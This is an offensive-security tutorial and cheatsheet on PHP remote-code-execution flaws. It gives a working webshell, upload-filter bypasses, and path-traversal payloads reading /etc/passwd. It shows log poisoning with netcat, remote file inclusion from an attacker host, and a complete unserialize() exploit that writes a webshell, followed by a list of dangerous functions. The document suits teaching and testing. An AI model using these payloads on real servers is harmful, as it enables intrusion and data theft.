# PHP

This is a overview of common PHP-based web vulnerabilities that can lead to remote code execution (RCE).

At the bottom is cheatsheet for dangerous PHP functions.

* [File Upload Abuse](#file-upload-abuse)
* [File Inclusions](#file-inclusions)
  * [Local File Inclusion (LFI)](#local-file-inclusion)
  * [Remote File Inclusion (RFI)](#remote-file-inclusion)
* [Unsafe eval()](#unsafe-eval)
* [Unsafe unserialize()](#unsafe-unserialize)
* [Dangerous PHP functions Reference](#dangerous-php-functions-reference)


## File Upload Abuse

This vulnerability can occur with all web servers that support dynamically generated web pages via server-side scripting (PHP, JSP, ASP and co).

The most blatant example for this vulnerability would be: 

* A web server runs PHP 
* It allows you to upload arbitrary files
* Those files get stored somewhere in the server directory and are accessible by the user

This usually either happens through some web application that allows you to upload files via a web form, or there is some open FTP server, SMB share, other dedicated file upload service that allows you to plant files in the web server directory.

Of course what you can then do is simply uploading a PHP file with your malicious code and open it in your browser. 

Create a PHP file `shell.php` with the following content:

```php
<?php echo '<pre>' . shell_exec(urldecode($_GET['cmd'])) . '</pre>';?>
```

This is called a "webshell". Upload it to the server.

When you access that PHP file with your browser, then you can supply commands via the `?cmd=command_here` url parameter and get the output of the command printed in your browser:
```default
http://vulnserver.example/uploads/shell.php?cmd=whoami
```
Your browser prints:
```php
www-data
```
Code Execution achieved.


### Upload Filters

Now the above example is rather obvious. Most developers have at least some common sense and try to limit what you can upload.

If there is some web application that allows you to upload files, then there tend to be some kind of upload filters that prevent you from uploading PHP files. Implementing upload filters is pretty hard though, which commonly leads to loopholes that allow an attacker to circumvent them.

Some filters just filter out files with the `.php` file extension.

Examples for circumventing file extensions filters:

* Alternative php file endings: `.php3`, `.php4`, `.php5`, `.php6`, `.phtml`, `.phpt`, `.pht`
* Uppercase: `.PHP`, `.PHP3`, `.PHP4`, etc.
* Mixed case: `.Php`, `.pHp`, etc.
* Double extension: `.php.jpg` or `.jpg.php`
* Control characters: `.php%00.gif`

Some content based filters can be tricked simply by appending some php code to a JPG file or changing the Content-Type header in multipart form data requests. The limit appears to be your imagination.

For more examples and other types of upload filter bypass techniques, see: [EDB Paper 45074](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)


## File Inclusions

PHP has a variety of build-in functions that allow a developer to construct a web page from several different PHP files:

```php
$filename = "./some_dir/some_file.php"

include($filename)
include_once($filename)
require($filename)
require_once($filename)
```

These functions will include all of the text from a supplied file and will also execute any PHP code blocks inside of the included file. They all kind of do the same thing, so I won't explain each one in detail.

**File Inclusion vulnerabilities** arise when the developer gives the user control over which files should be included. More specifically by letting the user input the filename or path to a file that should be included.

These vulnerabilities are usually split into the following two categories:

* LFI - **Local File Inclusion** - loads a local file from the PHP web server filesystem (which was not intended to be included)
* RFI - **Remote File Inclusion** - loads a file from a remote server (usually controlled by the attacker)

Here "Local" refers to the viewpoint of the PHP server, not the viewpoint of the attacker.

**RFI** is usually more dangerous, or at least easier to exploit, since we might be able to just **include our own remotely hosted PHP files** and execute them on the target server.

Meanwhile **LFI** quite often *"only"* leaks files from the file system of the server, which is an **Information Disclosure Vulnerability** (already pretty dangerous). If we can access files outside of the web server directory, then this is also known as a **Path Traversal Vulnerability**.

Under some circumstances **LFI can also lead to code execution**. But that usually requires some way to inject PHP code into files on the target server or some sort of file upload functionality.

### Local File Inclusion

Here is an example for vulnerable code that allows a **Local File Inclusion (LFI)**:

```php
<?php
$filename = $_GET["show"];
Include($_SERVER["DOCUMENT_ROOT"]."/". $filename .".php");
?>
```

The intended usage by a programmer would be something like this: `http://vulnserver/index.php?show=aboutus`

The link above would load the `aboutus.php` file from the PHP server base directory (e.g.: `/var/www/html/aboutus.php`). 

In other words, the url parameter `?show=` lets you include some PHP files on the server. Which serves as some kind of rudimentary navigation.

Let's turn that into a **Path Traversal Exploit** by visiting:

```default
http://vulnserver/index.php?show=../../../../../../etc/passwd%00
```

And ta-dah, it prints the content of the `/etc/passwd` file on the server, leaking the usernames of all users on the server. Other examples of files that could be included are config files with credentials, ssh keys, keystores ore even database files.

Of course, should the server run with root privileges, then you could also leak `/etc/shadow` and get the password hashes of all users, which you can then crack. But usually web servers run as a low privilege user like `www-data` (but it doesn't hurt to check).

To explain what happens here:

* The `../../../../../../` navigates six or less directories up until we hit the root filesystem directory "`/`". You might have to add more than six `"../"` depending on the directory structure on the server. In this example the starting point is `/var/www/html/`, so even three would have been enough.
* The `/etc/passwd` is the file we want to include, as seen from root directory
* The `%00` is an escaped NULL byte that will terminate the string prematurely, so the `.php` part gets ignored. Without this we might only be able to include files ending with `.php` given the above code segment. This NULL byte trick only works with PHP version <5.3.4

The above example is for a Linux or other *nix server. But this bug can also occur the same way on Windows, you might just have to use escaped backslashes `..\\..\\` or similar tricks.

For more tricks and details see: [PayloadsAllTheThings: LFI Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-lfi)


#### LFI RCE Through File Upload

Now if there is some way to **upload files to the web server** and you know (or can guess) where that file gets stored, then you can simply upload a PHP file with your exploit code. Use the path traversal and execute your uploaded file. Ta-dah, code execution achieved.

The `include()` function will assume the included file contains PHP and tries to interpret it, so the uploaded file does not neccessarily need to have the `.php` file extension. 

If there are upload restrictions, then see the [Upload Filters section](#upload-filters), especially the link at the bottom.


#### LFI RCE Through Poisoning

**Log Poisoning** is the most common poisoning attack. 

Basically you inject PHP code into a server log file by crafting a special request that will cause an error or log-worthy event. Afterwards you include the log file via LFI and the code snippet in there gets executed.

Let's assume we can include the log file of the target server: `/var/log/vulnserver/access.log`

When we include that file we might see a print-out like this: 

```default
10.0.13.37 - - [08/Mar/2021 22:52:03] code 404, message File not found - 
127.0.0.1 - - [08/Mar/2021 23:09:00] "GET /admin.html HTTP/1.1" 404 -
10.0.13.37 - - [08/Mar/2021 23:09:17] "GET /test.html HTTP/1.1" 200 -
10.0.13.37 - - [08/Mar/2021 23:09:17] "GET /index.html HTTP/1.1" 200 -
```

Now it's usually rather easy to inject some PHP in there.

Just send the following with netcat:

```bash
$ nc vulnserver.example 80
GET <?php phpinfo() ?>
# [press enter]
```

This might show up in the target server log file like this:

```default
...
10.0.13.37 - - [08/Mar/2021 23:13:10] code 400, message Bad request version ('?>')
10.0.13.37 - - [08/Mar/2021 23:13:10] "GET <?php phpinfo() ?>" 400 -
```

If we include that log file via LFI again, then the PHP we have injected will get interpreted and we will see the `phpinfo()` display, which confirms that we have gained code execution.

It's not just log files you can poison. Some services store data as files, like SQLite. If you can create a string in that database, then you might also be able to inject some PHP code into the database storage file. You have to get a bit creative with these poisoning attacks.


### Remote File Inclusion

Here is an example for vulnerable code that allows a **Remote File Inclusion (RFI)**:

```php
$filepath = $_GET["path"];
include($filepath . "/example.php");
```

This code does not only allow us to include files from the target server (LFI), it also allows us to include files from a remote server (RFI).

Let's assume our own machine has the IP address `10.0.13.37`. 

For this to work we should have an HTTP server running on our machine. Kali comes pre-installed with `apache2`, but you can also start an **instant HTTP server with python3**:

```bash
sudo python3 -m http.server 80
```

With the above PHP code we can just do the following:

```default
http://vulnserver.example/vuln.php?path=http://10.0.13.37
```

This would cause the PHP server to try and include the remote file: `http://10.0.13.37/example.php`

Our HTTP server will log the failed request reaching us from the target server:

```default
[08/Mar/2021 22:52:03] "GET /example.php HTTP/1.1" 404 -
```

This means we can create `example.php` in our own HTTP server root directory and put some PHP code in it:

Our `example.php`:

```php
<?php echo '<pre>' . shell_exec('hostname') . '</pre>';?>
```

Now if we visit the url again, then the code in our `example.php` file gets included and executed:

```default
http://vulnserver.example/vuln.php?path=http://10.0.13.37
```

Your browser prints:
```php
vulnserver
```
The result of the `hostname` command in our PHP file.

For more tricks and details see: [PayloadsAllTheThings: RFI Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-rfi)


## Unsafe eval()

> If eval() is the answer, you're almost certainly asking the wrong question. -- Rasmus Lerdorf

The `eval()` function allows the execution of arbitrary PHP code.

```default
eval()                      - execute supplied string as PHP code
assert()                    - same as eval()
preg_replace('/.*/e',...)   - /e does an eval() on the match
```

If user input gets naively inserted into any of the above functions, then this might allow remote code execution by an attacker.

`eval("\$result = 1 + 1; phpinfo()")` will print the phpinfo() page.

`eval("\$result = 1 + 1; echo shell_exec('id');")` will print the output of the `id` command.

## Unsafe unserialize()

If you can:

* inject into a `unserialize()` PHP function
* there is a class with magic function `__wakeup()` or `__destruct()` in that php file

then you might be able to gain code execution.

### Basics

The function `serialize()` creates a string representation of a PHP Object. 

```php
<?php
class MyClass
{
	public $someVar = "hallo world!";
	public $count = 12345;
}

print serialize(new MyClass)
// O:7:"MyClass":2:{s:7:"someVar";s:12:"hallo world!";s:5:"count";i:12345;}
?>
```

The function `unserialize()` turns that string representation back into a PHP Object based on an existing class definition. 

```php
<?php
class MyClass
{
	public $someVar = "hallo world!";
	public $count = 12345;
}

$serialized_obj = serialize(new MyClass);
print $serialized_obj . "\n";
// O:7:"MyClass":2:{s:7:"someVar";s:12:"hallo world!";s:5:"count";i:12345;}

$newObj = unserialize('O:7:"MyClass":2:{s:7:"someVar";s:9:"injected!";s:5:"count";i:12345;}');
print $newObj->someVar . "\n";
// injected!
?>
```


### Magic Functions

If that class has the magic functions `__wakeup()` or `__destruct()`, then those will be executed as part of the deserialization process. 

The function `__wakeup()` is called when the object is created and `__destruct()` is called before the object is collected by the garbage collector when no reference for that object exists anymore.

That means if we can supply custom serialized object strings, then we can highjack either of those functions and supply custom data to them. Depending on the content of these function definitions we might be able to cause some mayhem.

### Serialization Format

If we have a serialized Object:

```default
O:7:"MyClass":2:{s:7:"someVar";s:12:"hallo world!";s:5:"count";i:12345;}
```

* `O` (uppercase letter o, not a zero) means Object, other types are `s` for string or `i` for integer, etc.
* `O:7:"MyClass"` translates to: Object with a name that is 7 characters long, which is "MyClass"
* The `:2:{...}` that follows means the class has two fields with definitions that follow in the `{ ... }`
* `s:5:"count";i:12345;` The parameter definitions in the `{...}` are listed with variable name and variable value separately defined.

### Example Vulnerability

Let's say we have the source code for a php file that is being served by a web server, named `vuln.php`:

```php
<?php
// Web server file vuln.php
// e.g. with url: http://vulnserver.example/vuln.php
class VulnClass
{
    public $out_file = "boring.txt";
    public $data = "";

    public function doSomething()
    {
        $data = "whatever";
    }

    public function __destruct()
    {
        file_put_contents(__DIR__ . '/' . $this ->out_file, $this->data);
    }
}

// What could possibly go wrong???
$input = $_GET['secureparam'] ?? '';
unserialize($input);
?>
```

This somewhat contrived example takes the value of the HTTP GET url parameter `http://vulnserver.example/vuln.php?secureparam=...` and runs it through `unserialize()`. Which means we can easily inject into it.

The php file contains a class definition for `VulnClass` which contains a magic function `__destruct()`. As it so happens that `__destruct()` function actually writes the content of the class field `$data` to a file in the current web server directory with the filename being taken from class field `$out_file`.

So if we can create an Object from that class definition and set custom values for `$data` and `$out_file`, then we can write arbitary files in the same directory as the vulnerable php file.

So let's use this injection vector to create a php webshell.

On your own machine create your own version of the class and serialize it with a php script, named `exploit.php`:

```php
<?php
// Local file exploit.php
class VulnClass
{
	public $out_file = "shell.php";
	public $data = "<?php echo '<pre>' . shell_exec(urldecode(\$_GET['cmd'])) . '</pre>';?>";
}

print urlencode(serialize(new VulnClass));
print "\n";
?>
```

In your local terminal run: 
```bash
php exploit.php
``` 

It should output the serialized object string. But you will notice that we have also run the serialized string through the `urlencode()` standard function:

```php
O%3A9%3A%22VulnClass%22%3A2%3A%7Bs%3A8%3A%22out_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A70%3A%22%3C%3Fphp+echo+%27%3Cpre%3E%27+.+shell_exec%28urldecode%28%24_GET%5B%27cmd%27%5D%29%29+.+%27%3C%2Fpre%3E%27%3B%3F%3E%22%3B%7D
```

We need to urlencode the serialized object string since we will supply it as url parameter. This might not be necessary depending on the injection point. For instance the vulnerable php script might take its input from an HTTP cookie or HTTP request body instead.

Now we can supply that to the vulnerable php file and open it in burp repeater or our web browser:

```default
http://vulnserver.example/vuln.php?secureparam=O%3A9%3A%22VulnClass%22%3A2%3A%7Bs%3A8%3A%22out_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A70%3A%22%3C%3Fphp+echo+%27%3Cpre%3E%27+.+shell_exec%28urldecode%28%24_GET%5B%27cmd%27%5D%29%29+.+%27%3C%2Fpre%3E%27%3B%3F%3E%22%3B%7D
```

If this has worked then now there should be a webshell file located at: 
```default
http://vulnserver.example/shell.php
```

And we can test that it works by supplying some command:

```default
http://vulnserver.example/shell.php?cmd=whoami

www-data
```

## Dangerous PHP functions Reference

* Stolen from here: https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720
* Which in turn was stolen from here: https://stackoverflow.com/a/3697776

> Most of these function calls are classified as Sinks. When a tainted variable (like $_REQUEST) is passed to a sink function, then you have a vulnerability. Programs like RATS and RIPS use grep like functionality to identify all sinks in an application. This means that programmers should take extra care when using these functions, but if they where all banned then you wouldn't be able to get much done. 

### Direct Command Execution

These straight up execute shell commands. Which is their intended use. User input should never end up in either of those or SHTF.

```default
exec           - Returns last line of commands output
passthru       - Passes commands output directly to the browser
system         - Passes commands output directly to the browser and returns last line
shell_exec     - Returns commands output
\`\` (backticks) - Same as shell_exec()
popen          - Opens read or write pipe to process of a command
proc_open      - Similar to popen() but greater degree of control
pcntl_exec     - Executes a program
```

### PHP Code Injection

These functions can lead to the execution of PHP code. Either directly, like with `eval()` or via file inclusion.

```default
eval()
assert()  - identical to eval()
preg_replace('/.*/e',...) - /e does an eval() on the match
create_function()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);
$func = new ReflectionFunction($_GET['func_name']); $func->invoke(); or $func->invokeArgs(array());
```

### List of functions which accept callbacks

These functions accept a string parameter which could be used to call a function of the attacker's choice. Depending on the function the attacker may or may not have the ability to pass a parameter to the callback function. In that case an Information Disclosure function like phpinfo() could be used.

```default
Function                     => Position of callback arguments
'ob_start'                   =>  0,
'array_diff_uassoc'          => -1,
'array_diff_ukey'            => -1,
'array_filter'               =>  1,
'array_intersect_uassoc'     => -1,
'array_intersect_ukey'       => -1,
'array_map'                  =>  0,
'array_reduce'               =>  1,
'array_udiff_assoc'          => -1,
'array_udiff_uassoc'         => array(-1, -2),
'array_udiff'                => -1,
'array_uintersect_assoc'     => -1,
'array_uintersect_uassoc'    => array(-1, -2),
'array_uintersect'           => -1,
'array_walk_recursive'       =>  1,
'array_walk'                 =>  1,
'assert_options'             =>  1,
'uasort'                     =>  1,
'uksort'                     =>  1,
'usort'                      =>  1,
'preg_replace_callback'      =>  1,
'spl_autoload_register'      =>  0,
'iterator_apply'             =>  1,
'call_user_func'             =>  0,
'call_user_func_array'       =>  0,
'register_shutdown_function' =>  0,
'register_tick_function'     =>  0,
'set_error_handler'          =>  0,
'set_exception_handler'      =>  0,
'session_set_save_handler'   => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate'    => array(2, 3),
'sqlite_create_function'     =>  2,
```

### Information Disclosure

Most of these function calls are not sinks. But rather it maybe a vulnerability if any of the data returned is viewable to an attacker. If an attacker can see phpinfo() it is definitely a vulnerability.

```default
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```

## Other

```default
extract - Opens the door for register_globals attacks (see study in scarlet).
parse_str -  works like extract if only one argument is given.  
putenv
ini_set
mail - has CRLF injection in the 3rd parameter, opens the door for spam. 
header - on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area. 
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```

## Filesystem Functions

According to RATS all filesystem functions in php are nasty. Some of these don't seem very useful to the attacker. Others are more useful than you might think. For instance if allow_url_fopen=On then a url can be used as a file path, so a call to copy($_GET['s'], $_GET['d']); can be used to upload a PHP script anywhere on the system. Also if a site is vulnerable to a request send via GET everyone of those file system functions can be abused to channel and attack to another host through your server.

```default
// open filesystem handler
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
// write to filesystem (partially in combination with reading)
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng   - 2nd parameter is a path.
imagewbmp  - 2nd parameter is a path. 
image2wbmp - 2nd parameter is a path. 
imagejpeg  - 2nd parameter is a path.
imagexbm   - 2nd parameter is a path.
imagegif   - 2nd parameter is a path.
imagegd    - 2nd parameter is a path.
imagegd2   - 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
// read from filesystem
file_exists
file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
highlight_file
show_source
php_strip_whitespace
get_meta_tags
```


## References

* [A Study in Scarlet](https://seclists.org/bugtraq/2001/Jul/att-26/studyinscarlet.txt)
* [EDB Paper 45074](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
* https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720 and https://stackoverflow.com/a/3697776
